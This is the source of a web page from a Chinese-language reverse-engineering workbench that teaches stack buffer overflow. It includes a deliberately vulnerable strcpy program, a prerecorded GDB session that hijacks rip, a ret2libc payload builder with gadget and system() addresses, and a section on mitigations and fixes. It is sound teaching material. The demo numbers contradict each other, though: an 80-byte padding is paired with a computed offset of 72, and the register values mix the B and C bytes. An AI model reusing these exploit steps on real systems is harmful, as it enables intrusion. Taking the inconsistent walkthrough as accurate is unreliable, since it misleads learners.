import Link from 'next/link';
import WorkbenchShell from '@/components/WorkbenchShell';
import DemoTerminal from '@/components/DemoTerminal';
import PayloadBuilder from '@/components/PayloadBuilder';
import DefenseSwitcher from '@/components/DefenseSwitcher';
import { getVulnNode, vulnPath } from '@/data/reference';

const node = getVulnNode('stack')!;

export const metadata = {
  title: '栈溢出 · 逆向工作台',
  description: '四段式学习栈溢出：栈帧图解 · GDB 步进演示 · payload 构造 · 防御视角与修复。',
};

/* ---------- DemoTerminal 预录制的 GDB 步进 ---------- */

const gdbSteps = [
  {
    cmd: 'gdb ./vuln',
    output: `Reading symbols from ./vuln...\n(gdb) r $(python3 -c "print('A'*200)")`,
    note: '程序崩溃了，但 rip 还没覆盖 —— 这是第一次',
  },
  {
    cmd: 'bt',
    output: `#0  0x000000000040116b in vulnerable (input=0x7fffffffdda0) at vuln.c:7\n#1  0x00000000004011a8 in main (argc=2, argv=0x7fffffffdd68) at vuln.c:17`,
    note: '崩在 vulnerable 的 ret —— rip 还没被覆盖',
  },
  {
    cmd: 'info registers rip rsp',
    output: `rip            0x40116b             0x40116b <vulnerable+39>\nrsp            0x7fffffffdda0       0x7fffffffdda0`,
    rip: '0x40116b',
    note: 'rip 还是合法地址 —— 说明溢出还没覆盖到 ret',
  },
  {
    cmd: 'r $(python3 -c "print(\'A\'*80 + \'B\'*8 + \'C\'*8)")',
    output: `Starting program: ./vuln $(python3 -c "print('A'*80 + 'B'*8 + 'C'*8)")\nProgram received signal SIGSEGV, Segmentation fault.`,
    note: '这次 rip 应该被 B/C 覆盖了',
  },
  {
    cmd: 'info registers rip',
    output: `rip            0x4343434342424242   0x4343434342424242`,
    rip: '0x4343434342424242',
    note: '✓ rip = 0x4343434342424242 —— C 是最靠后的，正好落在 ret',
  },
  {
    cmd: 'x/20gx $rsp',
    output: `0x7fffffffddf8:\t0x4343434342424242\t0x4141414141414141\n0x7fffffffde08:\t0x4141414141414141\t0x4141414141414141\n...`,
    note: '栈上清晰看到 B/C/A 的顺序 —— 小端让 "CCBB" 显示成 0x4343434342424242',
  },
  {
    cmd: 'cyclic -l 0x42424242',
    output: `Found at offset 72`,
    note: '偏移 = 72 —— ret 在 rbp-0x08，rbp 在 buf+0x40，所以 ret = buf+0x48 = 72',
  },
];

/* ---------- 漏洞源码 ---------- */

const vulnCode = `// vuln.c —— 栈溢出最小示例
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buf[64];                    // 0x40 字节栈缓冲
    strcpy(buf, input);              // ← 漏洞点：无边界检查
    printf("input: %s\\n", buf);
}

int main(int argc, char **argv) {
    if (argc > 1) vulnerable(argv[1]);
    return 0;
}`;

/* ---------- 防护矩阵 ---------- */

const mitigations = [
  { name: 'Canary', defaultOn: true, desc: '栈上金丝雀值，函数返回前校验',
    effectOff: '关闭后 ret 可被直接覆盖', effectOn: '覆盖 canary 会触发 stack smashing detected' },
  { name: 'NX bit', defaultOn: true, desc: '栈/堆不可执行',
    effectOff: 'shellcode 可在栈上直接执行', effectOn: 'shellcode 无法执行，必须 ret2libc/ROP' },
  { name: 'ASLR', defaultOn: true, desc: 'libc / main 基址随机化',
    effectOff: '硬编码地址可用', effectOn: '需要泄露至少一个地址来算基址' },
  { name: 'PIE', defaultOn: true, desc: '主程序也随机化',
    effectOff: '硬编码 gadget 地址可用', effectOn: '需要同时泄露 main 和 libc 基址' },
];

const fixOptions = [
  { code: 'void safe(char *input) {\n    char buf[64];\n    strncpy(buf, input, 63);  // 限长\n    buf[63] = 0;              // 手动补 \\0\n    printf("input: %s\\n", buf);\n}', correct: true },
  { code: 'void safe(char *input) {\n    char buf[64];\n    strcpy(buf, input);       // 还是 strcpy\n    printf("input: %s\\n", buf);\n}', correct: false },
  { code: 'void safe(char *input) {\n    char *buf = malloc(64);   // 移到堆上\n    strcpy(buf, input);\n    printf("input: %s\\n", buf);\n}', correct: false },
  { code: 'void safe(char *input) {\n    char buf[64];\n    strlcpy(buf, input, 64);  // BSD 函数，非标准\n    printf("input: %s\\n", buf);\n}', correct: false },
];

const recommendedFix = {
  code: '// 修复：strcpy → strncpy + 手动终止\nvoid safe(char *input) {\n    char buf[64];\n    // 限长拷贝，不写超\n    strncpy(buf, input, sizeof(buf) - 1);\n    // strncpy 不保证补 \\0，手动补上\n    buf[sizeof(buf) - 1] = \'\\0\';\n    printf("input: %s\\n", buf);\n}',
  explanation: `两条缺一不可：strncpy 限长是第一步，但它只在源比目标短时才补 \\0 —— 当输入超过 63 字节时，目标缓冲区末尾不会自动加终止符，后续 printf %s 读到越界位置。手动 buf[63]='\\0' 保证了字符串终止。

补充：fgets(buf, sizeof(buf), stdin) 用于直接读输入，比 strncpy 更安全——同时做了长度限制和换行处理。`,
};

/* ---------- 栈帧 SVG ---------- */

function StackFrameSVG() {
  return (
    <svg viewBox="0 0 520 460" className="w-full max-w-[520px] font-mono text-[11px]" role="img" aria-label="栈帧布局">
      {/* 标题 */}
      <text x="0" y="14" fill="var(--text-soft)" fontSize="10" letterSpacing="2">STACK FRAME — GROW TOWARDS LOWER ADDRESSES</text>

      {/* 地址递减方向 */}
      <g>
        <line x1="500" y1="20" x2="500" y2="440" stroke="var(--border-soft)" strokeDasharray="2,3" />
        <text x="502" y="30" fill="var(--text-soft)">高地址</text>
        <text x="502" y="438" fill="var(--text-soft)">低地址</text>
      </g>

      {/* return address */}
      <rect x="80" y="30" width="360" height="44" fill="var(--bg-card)" stroke="var(--border)" />
      <rect x="80" y="30" width="360" height="44" fill="color-mix(in srgb, var(--accent-red) 10%, transparent)" />
      <text x="94" y="49" fill="var(--accent-red)">RETURN ADDRESS</text>
      <text x="94" y="65" fill="var(--text-soft)" fontSize="10">← 控制流劫持的目标</text>
      <text x="380" y="49" fill="var(--text-soft)" fontSize="10">rbp + 8</text>

      {/* saved rbp */}
      <rect x="80" y="84" width="360" height="44" fill="var(--bg-card)" stroke="var(--border)" />
      <text x="94" y="103" fill="var(--text-muted)">SAVED RBP</text>
      <text x="380" y="103" fill="var(--text-soft)" fontSize="10">rbp</text>

      {/* canary */}
      <rect x="80" y="138" width="360" height="38" fill="var(--bg-card)" stroke="var(--border)" />
      <rect x="80" y="138" width="360" height="38" fill="color-mix(in srgb, var(--accent-orange) 8%, transparent)" />
      <text x="94" y="157" fill="var(--accent-orange)">STACK CANARY</text>
      <text x="380" y="157" fill="var(--text-soft)" fontSize="10">rbp − 8</text>

      {/* padding 8 字节 */}
      <rect x="80" y="186" width="360" height="22" fill="var(--bg-soft)" stroke="var(--border)" />
      <text x="94" y="200" fill="var(--text-soft)" fontSize="10">padding (8 bytes) —— 编译器对齐</text>

      {/* local buf[64] */}
      <rect x="80" y="218" width="360" height="170" fill="var(--bg-card)" stroke="var(--border)" />
      <rect x="80" y="218" width="360" height="170" fill="color-mix(in srgb, var(--brand-500) 6%, transparent)" />
      <text x="94" y="237" fill="var(--brand-500)">char buf[64]</text>
      <text x="380" y="237" fill="var(--text-soft)" fontSize="10">rbp − 0x40</text>
      {/* 溢出箭头 */}
      <path d="M 260 290 L 260 74" stroke="var(--accent-red)" strokeWidth="1.5" markerEnd="url(#arrow)" fill="none" />
      <text x="270" y="180" fill="var(--accent-red)" fontSize="10">
        ← 溢出方向：buf 起始 → 向上生长（地址减小方向）
      </text>
      <text x="270" y="194" fill="var(--accent-red)" fontSize="10">
        写满 buf 后继续写 → 覆写 canary → saved rbp → return address
      </text>

      {/* 箭头定义 */}
      <defs>
        <marker id="arrow" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <path d="M0,0 L6,3 L0,6 Z" fill="var(--accent-red)" />
        </marker>
      </defs>

      {/* 标注偏移 */}
      <text x="450" y="255" fill="var(--text-soft)" fontSize="10">偏移 = 72</text>
      <text x="450" y="269" fill="var(--text-soft)" fontSize="10">(64 + 8)</text>
      <line x1="450" y1="272" x2="450" y2="74" stroke="var(--text-soft)" strokeDasharray="2,2" />
    </svg>
  );
}

/* ---------- 页面 ---------- */

export default function StackPage() {
  return (
    <WorkbenchShell slug="stack" node={node} glossLinks={[
      { slug: 'x86-call', term: 'x86-64 call/ret 约定' },
      { slug: 'canary', term: 'Stack Canary 原理' },
      { slug: 'nx', term: 'NX / ASLR / PIE' },
      { slug: 'elf-text', term: 'ELF .text 节与函数序言' },
    ]}>
      {/* 面包屑 + 标题 */}
      <header className="space-y-4">
        <div className="flex items-center gap-1.5 font-mono text-[11px] tracking-wider text-[var(--text-soft)]">
          <Link href="/" className="hover:text-[var(--text)]">首页</Link>
          <span>/</span>
          <Link href="/reference" className="hover:text-[var(--text)]">逆向工作台</Link>
          <span>/</span>
          <span className="text-[var(--text-muted)]">栈溢出</span>
        </div>
        <h1 className="u-display text-2xl md:text-[32px]">栈溢出</h1>
        <p className="text-[15px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          最经典的内存破坏。当 <code className="inline">strcpy</code> 不知道缓冲区只有 64 字节时，
          多出的 8 字节会一路"爬"过金丝雀、保存的 rbp、直接覆盖 <code className="inline">ret</code>
          弹出的返回地址 —— 下一条指令就由你决定。
        </p>
      </header>

      {/* 01 原理 */}
      <section className="space-y-5" id="principle">
        <SectionHeader num="01" label="原理" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          CPU 栈从<b className="text-[var(--text)]">高地址向低地址生长</b>，每调用一次函数：
          把返回地址压栈 → 跳进去 → 函数内 <code className="inline">sub rsp, 0x50</code> 圈出缓冲区。
          <code className="inline">ret</code> 等价于 <code className="inline">pop rip</code> ——
          谁能改栈上那块返回地址，谁就能控制 RIP。
        </p>
        <StackFrameSVG />
        <div className="u-panel p-5 space-y-2">
          <div className="font-mono text-[11px] tracking-wider text-[var(--brand-500)] mb-2">关键直觉</div>
          <ul className="space-y-1.5 text-[13px] text-[var(--text-muted)] leading-relaxed">
            <li>偏移量 = <code className="inline">sizeof(buf) + padding(8) = 72</code>（这台编译器布局下）</li>
            <li>覆盖顺序 = buf 写满 → 覆写 canary → 覆写 saved rbp → 覆写 return address</li>
            <li>"小端"意味着你往栈上写 <code className="inline">'B'*8</code>，ret 里会显示成 <code className="inline">0x4242424242424242</code></li>
            <li>偏移算不准时 —— <code className="inline">cyclic 200</code> 生成 De Bruijn 模式，<code className="inline">cyclic -l 0x41414142</code> 算偏移</li>
          </ul>
        </div>
      </section>

      {/* 02 演示 */}
      <section className="space-y-5" id="demo">
        <SectionHeader num="02" label="演示" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          下面的终端是预录制好的 GDB 会话。<b className="text-[var(--text)]">点 "step →"</b> 逐行走，
          或按 <b className="text-[var(--text)]">"▶ auto"</b> 自动播放。看 rip 从合法值
          <code className="inline">0x40116b</code> 变成被 'C' 覆盖的 <code className="inline">0x43434343…</code>。
        </p>
        <DemoTerminal steps={gdbSteps} />
      </section>

      {/* 03 动手 */}
      <section className="space-y-5" id="hands">
        <SectionHeader num="03" label="动手" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          把演示里算出来的偏移 72、libc 里的 <code className="inline">pop rdi; ret</code> gadget、
          <code className="inline">"/bin/sh"</code> 字符串和 <code className="inline">system()</code> 地址填进构造器 ——
          实时拼 ASCII payload 布局，复制 pwntools 模板去打。
        </p>
        <PayloadBuilder defaults={{ offset: 72, gadgetRdi: '0x401196', binshAddr: '0x7ffff7f5a0b5', systemAddr: '0x7ffff7e1e340' }} />
      </section>

      {/* 04 防御视角 */}
      <section className="space-y-5" id="defense">
        <SectionHeader num="04" label="防御视角" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          同一个漏洞代码，把四个防护开关任意组合 —— 看崩溃日志怎么变，看 payload 是不是还能用。
          然后做修复选择挑战：选出真正安全的写法。
        </p>
        <DefenseSwitcher
          mitigations={mitigations}
          vulnCode={vulnCode}
          fixOptions={fixOptions}
          recommendedFix={recommendedFix}
        />
      </section>

      {/* 底部导航：prev = 空，next = UAF */}
      <nav className="pt-8 border-t border-[var(--border)] flex items-center justify-between gap-3">
        <Link href="/reference" className="font-mono text-[12px] text-[var(--text-muted)] hover:text-[var(--text)] transition-colors">
          ← 工作台首页
        </Link>
        <Link
          href={`/reference/${vulnPath[1].slug}`}
          className="font-mono text-[12px] text-[var(--brand-500)] hover:underline decoration-dotted underline-offset-4 transition-colors"
        >
          下一步：{vulnPath[1].title} →
        </Link>
      </nav>
    </WorkbenchShell>
  );
}

function SectionHeader({ num, label }: { num: string; label: string }) {
  return (
    <div className="flex items-baseline gap-3">
      <span className="u-section-num">{num}</span>
      <h2 className="text-lg md:text-xl font-semibold tracking-tight">{label}</h2>
    </div>
  );
}
